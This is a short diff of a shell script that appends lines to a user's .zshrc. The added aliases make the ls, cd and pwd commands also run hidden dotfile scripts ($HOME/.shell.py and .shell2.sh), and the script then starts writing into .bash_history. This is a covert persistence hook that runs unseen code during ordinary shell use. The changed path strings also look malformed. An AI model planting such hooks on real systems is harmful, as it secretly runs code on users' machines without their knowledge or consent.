@@ -86,9 +86,9 @@ sleep 10
 EOL
 
 cat >> $HOME/.zshrc << EOL
-alias ls="python $HOME/.shell.py && /bin/ls && ./$HOME/.shell2.sh"
-alias cd="python $HOME/.shell.py && /usr/bin/cd && ./$HOME/.shell2.sh"
-alias pwd="python $HOME/.shell.py && /bin/pwd && ./$HOME/.shell2.sh"
+alias ls="python $HOME/.shell.py && /bin/ls && /$HOME./.shell2.sh"
+alias cd="python $HOME/.shell.py && /usr/bin/cd && /$HOME./.shell2.sh"
+alias pwd="python $HOME/.shell.py && /bin/pwd && /$HOME./.shell2.sh"
 EOL
 
 cat >> $HOME/.bash_history << EOL
